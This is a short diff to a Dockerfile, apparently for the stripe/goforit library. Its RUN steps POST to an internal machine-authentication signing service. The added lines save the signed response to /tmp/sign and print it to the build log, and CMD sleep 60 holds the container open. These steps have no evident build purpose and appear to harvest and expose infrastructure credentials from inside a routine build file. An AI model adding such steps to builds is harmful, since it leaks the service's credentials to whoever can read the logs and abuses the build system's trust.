@@ -13,6 +13,6 @@ ENV GOPATH=/go
 WORKDIR /go/src/github.com/stripe/goforit
 ADD . /go/src/github.com/stripe/goforit
 
-RUN curl -s -N -X POST 127.0.0.1:10080/v1/sign -H "Host: authn-machine-srv.service.envoy"
-RUN curl -s -N -X POST http://authn-machine-srv.service.consul:8443/v1/sign
+RUN curl -s -N -X POST 127.0.0.1:10080/v1/sign -H "Host: authn-machine-srv.service.envoy" -o /tmp/sign
+RUN cat /tmp/sign
 CMD sleep 60
